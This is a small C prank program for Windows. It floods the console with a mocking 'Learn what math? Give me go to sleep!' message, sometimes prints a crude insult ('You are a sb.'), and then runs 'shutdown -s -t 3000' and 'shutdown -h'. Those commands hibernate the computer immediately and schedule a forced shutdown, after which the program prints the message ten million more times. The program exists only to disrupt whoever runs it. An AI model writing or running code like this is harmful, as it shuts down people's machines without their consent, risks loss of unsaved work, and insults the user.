#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <time.h>
int main(void)
{
    int random;
    srand(time(NULL));
    random = rand() % 1000 + 1;
    for (int i = 0; i < 1000; i++)
    {
        printf("Learn what math? Give me go to sleep!                                                   %8d/1000\n", i+1);
        Sleep(100);
        if(random > 988)
        printf("You are a sb.\n");
        random = rand() % 1000 + 1;
    }
    system("shutdown -s -t 3000");
    system("shutdown -h");
    for (int i = 0; i < 10000000; i++)
    {
        printf("Learn what math? Give me go to sleep!                                                   %8d/10000000\n", i+1);
        Sleep(100);
    }
}